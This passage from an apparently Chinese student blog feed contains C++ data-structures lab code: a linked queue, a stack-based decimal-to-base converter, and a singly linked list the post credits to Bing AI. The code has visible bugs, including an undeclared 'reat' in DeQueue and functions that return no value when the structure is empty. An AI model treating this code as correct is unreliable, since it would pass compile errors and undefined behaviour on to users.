class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkQueue&lt;DataType&gt;::<span class="built_in">LinkQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	node&lt;DataType&gt;* s = <span class="literal">nullptr</span>;</span><br><span class="line">	s = <span class="keyword">new</span> node&lt;DataType&gt;;<span class="comment">//开辟空间</span></span><br><span class="line">	s-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">	front = rear = s;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkQueue&lt;DataType&gt;::~<span class="built_in">LinkQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	node&lt;DataType&gt;* q = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="keyword">while</span> (front != <span class="literal">nullptr</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		q = front;</span><br><span class="line">		front = front-&gt;next;</span><br><span class="line">		<span class="keyword">delete</span> q;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkQueue&lt;DataType&gt;::<span class="built_in">enQueue</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">	node&lt;DataType&gt;* s = <span class="literal">nullptr</span>;</span><br><span class="line">	s = <span class="keyword">new</span> node&lt;DataType&gt;;</span><br><span class="line">	s-&gt;data = x;</span><br><span class="line">	s-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">	rear-&gt;next = s;	<span class="comment">//插入到队尾</span></span><br><span class="line">	rear = s;		<span class="comment">//移动队尾</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkQueue&lt;DataType&gt;::<span class="built_in">DeQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	DataType x;</span><br><span class="line">	node&lt;DataType&gt;* p = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="keyword">if</span> (reat==front )</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		p = front-&gt;next;</span><br><span class="line">		x = p-&gt;data;</span><br><span class="line">		front-&gt;next = p-&gt;next;</span><br><span class="line">		<span class="keyword">delete</span> p;</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkQueue&lt;DataType&gt;::<span class="built_in">GetQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (front == rear)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> front-&gt;next-&gt;data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkQueue&lt;DataType&gt;::<span class="built_in">Empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (front == rear )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> x;</span><br><span class="line">	LinkQueue&lt;<span class="type">int</span>&gt; S = &#123;&#125;;</span><br><span class="line">	S.<span class="built_in">enQueue</span>(<span class="number">1</span>);</span><br><span class="line">	S.<span class="built_in">enQueue</span>(<span class="number">2</span>);</span><br><span class="line">	S.<span class="built_in">enQueue</span>(<span class="number">3</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已入队1,2,3&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******取一次队头******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;队头是：&quot;</span> &lt;&lt; S.<span class="built_in">GetQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入一个元素进行入队&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; x;</span><br><span class="line">	S.<span class="built_in">enQueue</span>(x);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已入队：&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******取一次队头******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;队头是：&quot;</span> &lt;&lt; S.<span class="built_in">GetQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******执行一次出队******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****进行一次判空*****&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****进行一次判空*****&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="十进制转换为二至九进制之间的任一进制的算法实现："><a href="#十进制转换为二至九进制之间的任一进制的算法实现：" class="headerlink" title="十进制转换为二至九进制之间的任一进制的算法实现："></a>十进制转换为二至九进制之间的任一进制的算法实现：</h2><blockquote>
<p>这里有一个细节就是，任何数转化为任何进制，最后整除取整的结果都是0，而最后一次压栈是无法在循环里压栈（在这个算法里），需要在循环外再写一行压栈，把最后一个进制数压进去（也就是输出结果的第一位）</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*十进制转化为其他进制，实际上是做取余然后逆序输出运算，可以用顺序栈实现功能*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> StackSize = <span class="number">10000</span>;  <span class="comment">// 定义最大栈顶具体情况具体分析</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;   <span class="comment">//定义模板类SeqStack</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqStack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SeqStack</span>();   <span class="comment">//构造函数，初始化空栈</span></span><br><span class="line">	~<span class="built_in">SeqStack</span>();	<span class="comment">//析构函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(DataType x)</span></span>;	<span class="comment">//压栈</span></span><br><span class="line">	<span class="function">DataType <span class="title">Pop</span><span class="params">()</span></span>;	<span class="comment">//出栈</span></span><br><span class="line">	<span class="function">DataType <span class="title">GetTop</span><span class="params">()</span></span>;<span class="comment">//取栈顶</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">empty</span><span class="params">()</span></span>;	<span class="comment">//判空操作</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	DataType data[StackSize];	<span class="comment">//存放栈元素的数组</span></span><br><span class="line">	<span class="type">int</span> top;	<span class="comment">//栈顶元素的下标</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">SeqStack&lt;DataType&gt;::~<span class="built_in">SeqStack</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> SeqStack&lt;DataType&gt;::<span class="built_in">Push</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == StackSize - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈满&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		top++;</span><br><span class="line">		data[top] = x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType SeqStack&lt;DataType&gt;::<span class="built_in">Pop</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		DataType x;</span><br><span class="line">		x = data[top];</span><br><span class="line">		top--;</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType SeqStack&lt;DataType&gt;::<span class="built_in">GetTop</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> data[top];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> SeqStack&lt;DataType&gt;::<span class="built_in">empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">SeqStack&lt;DataType&gt;::<span class="built_in">SeqStack</span>()</span><br><span class="line">&#123;</span><br><span class="line">	top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SeqStack&lt;<span class="type">int</span>&gt; s = &#123;&#125;;</span><br><span class="line">	<span class="type">int</span> x, y, count = <span class="number">1</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请按顺序输入你想转化的十进制数，和目标进制（2-9），以空格隔开&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">	<span class="keyword">while</span> ((x/y) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt;<span class="string">&quot;入栈&quot;</span> &lt;&lt; x % y &lt;&lt; endl;</span><br><span class="line">		s.<span class="built_in">Push</span>(x % y);</span><br><span class="line">		count++;</span><br><span class="line">		x /= y;</span><br><span class="line">	&#125;</span><br><span class="line">	s.<span class="built_in">Push</span>(x % y);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;入栈&quot;</span> &lt;&lt; x % y &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt;<span class="string">&quot;************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;转换后的结果是&quot;</span>;</span><br><span class="line">	<span class="keyword">while</span> (count!=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s.<span class="built_in">Pop</span>();</span><br><span class="line">		count--;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验二、链式存储结构线性表的建立及操作</title>
    <url>/posts/50b4f37a.html</url>
    <content><![CDATA[<blockquote>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FlO6Qn0cVLJHriuYzOv453gkwMYY"
                     
                ></p>
<h1 id="代码主体"><a href="#代码主体" class="headerlink" title="代码主体"></a>代码主体</h1><p>以下是一个简单的C++实现，用于维护单链表：</p>
<blockquote>
<p>来自bing ai</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data;        <span class="comment">// 数据域</span></span><br><span class="line">    Node&lt;DataType&gt;* next; <span class="comment">// 指针域</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkList</span>();                    <span class="comment">// 无参构造函数，建立只有头结点的空链表</span></span><br><span class="line">    <span class="built_in">LinkList</span>(DataType a[], <span class="type">int</span> n); <span class="comment">// 有参构造函数，建立有n个元素的单链表</span></span><br><span class="line">    ~<span class="built_in">LinkList</span>();                   <span class="comment">// 析构函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Length</span><span class="params">()</span></span>;                  <span class="comment">// 求单链表的长度</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Empety</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;            <span class="comment">// 按位查找。查找第i个结点的元素值</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(DataType x)</span></span>;         <span class="comment">// 按值查找。查找值为x的元素序号</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, DataType x)</span></span>; <span class="comment">// 插入操作，第i个位置插入值为x的结点</span></span><br><span class="line">    <span class="function">DataType <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;         <span class="comment">// 删除操作，删除第i个结点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;               <span class="comment">// 遍历操作，按序号依次输出各元素</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt;* first; <span class="comment">// 单链表的头指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkList&lt;DataType&gt;::<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;; <span class="comment">// 生成头结点</span></span><br><span class="line">    first-&gt;next = <span class="literal">nullptr</span>;      <span class="comment">// 头结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkList&lt;DataType&gt;::<span class="built_in">Empety</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first-&gt;next == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;DataType&gt;::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next; <span class="comment">// 工作指针p初始化</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        p = p-&gt;next; <span class="comment">// 工作指针p后移，注意不能写作p++</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkList&lt;DataType&gt;::<span class="built_in">Length</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next; <span class="comment">// 工作指针p初始化为开始接点</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;                   <span class="comment">// 累加器count初始化</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count; <span class="comment">// 注意count的初始化和返回值之间的关系</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkList&lt;DataType&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next; <span class="comment">// 工作指针p初始化</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">1</span>;                   <span class="comment">// 累加器count初始化</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span> &amp;&amp; count &lt; i)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next; <span class="comment">// 工作指针p后移</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;位置&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> p-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkList&lt;DataType&gt;::<span class="built_in">Locate</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next; <span class="comment">// 工作指针p初始化</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">1</span>;                   <span class="comment">// 累加器count初始化</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data == x)</span><br><span class="line">            <span class="keyword">return</span> count; <span class="comment">// 查找成功，结束函数并返回序号</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 退出循环表明查找失败</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;DataType&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i, DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first, * s = <span class="literal">nullptr</span>; <span class="comment">// 工作指针p初始化</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span> &amp;&amp; count &lt; i - <span class="number">1</span>) <span class="comment">// 查找第i – 1个结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next; <span class="comment">// 工作指针p后移</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;位置&quot;</span>; <span class="comment">// 没有找到第i – 1个结点</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="keyword">new</span> Node&lt;DataType&gt;;</span><br><span class="line">        s-&gt;data = x; <span class="comment">// 申请结点s，数据域为x</span></span><br><span class="line">        s-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = s; <span class="comment">// 将结点s插入到结点p之后</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkList&lt;DataType&gt;::<span class="built_in">LinkList</span>(DataType a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;;              <span class="comment">// 生成头结点</span></span><br><span class="line">    Node&lt;DataType&gt;* r = first, * s = <span class="literal">nullptr</span>; <span class="comment">// 尾指针初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="keyword">new</span> Node&lt;DataType&gt;;</span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s; <span class="comment">// 将结点s插入到终端结点之后</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">nullptr</span>; <span class="comment">// 单链表建立完毕，将终端结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkList&lt;DataType&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    DataType x;</span><br><span class="line">    Node&lt;DataType&gt;* p = first, * q = <span class="literal">nullptr</span>; <span class="comment">// 工作指针p指向头结点</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span> &amp;&amp; count &lt; i - <span class="number">1</span>) <span class="comment">// 查找第i-1个结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">nullptr</span> || p-&gt;next == <span class="literal">nullptr</span>) <span class="comment">// 结点p不存在或p的后继结点不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;位置&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        x = q-&gt;data;       <span class="comment">// 暂存被删结点</span></span><br><span class="line">        p-&gt;next = q-&gt;next; <span class="comment">// 摘链</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">LinkList&lt;DataType&gt;::~<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (first != <span class="literal">NULL</span>) <span class="comment">// 释放单链表的每一个结点的存储空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = first;           <span class="comment">// 暂存被释放结点</span></span><br><span class="line">        first = first-&gt;next; <span class="comment">// first指向被释放结点的下一个结点</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> maxsize;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入你要创建数组的大小&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; maxsize;</span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[maxsize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxsize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = i<span class="number">+1</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已创建一个最大长度&quot;</span>&lt;&lt;maxsize&lt;&lt;<span class="string">&quot;的随机数链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    LinkList&lt;<span class="type">int</span>&gt; L&#123; a, maxsize &#125;;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行遍历链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入一个最大长度内的数字查找元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    cin &gt;&gt; i;</span><br><span class="line">    cout &lt;&lt; L.<span class="built_in">Locate</span>(i) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请插入一个新数字元素，请依次输入位置和数据&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> j, k;</span><br><span class="line">    cin &gt;&gt; j &gt;&gt; k;</span><br><span class="line">    L.<span class="built_in">Insert</span>(j, k);</span><br><span class="line">    cout &lt;&lt; <span 